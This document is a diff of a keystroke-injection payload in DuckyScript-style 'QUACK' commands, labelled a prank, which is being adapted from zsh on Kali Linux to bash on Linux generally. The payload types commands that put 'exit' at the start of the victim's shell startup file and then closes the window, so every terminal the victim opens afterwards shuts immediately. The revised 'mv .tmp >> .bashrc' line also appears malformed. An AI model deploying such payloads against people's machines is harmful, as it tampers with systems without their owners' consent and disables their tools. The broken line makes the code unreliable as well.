@@ -4,7 +4,7 @@
 * REM # Author       : Aleff                                     #
 * REM # Version      : 1.0                                       #
 * REM # Category     : Prank                                     #
-* REM # Target       : Kali Linux                                #
+* REM # Target       : Linux                                     #
 * REM #                                                          #
 * REM ############################################################
 
@@ -20,10 +20,10 @@ QUACK DELAY 2000
 QUACK STRING echo "exit" > .tmp
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING cat .zshrc >> .tmp
+QUACK STRING cat .bashrc >> .tmp
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING mv .tmp >> .zshrc
+QUACK STRING mv .tmp >> .bashrc
 QUACK ENTER
 QUACK DELAY 500
 QUACK ALT F4
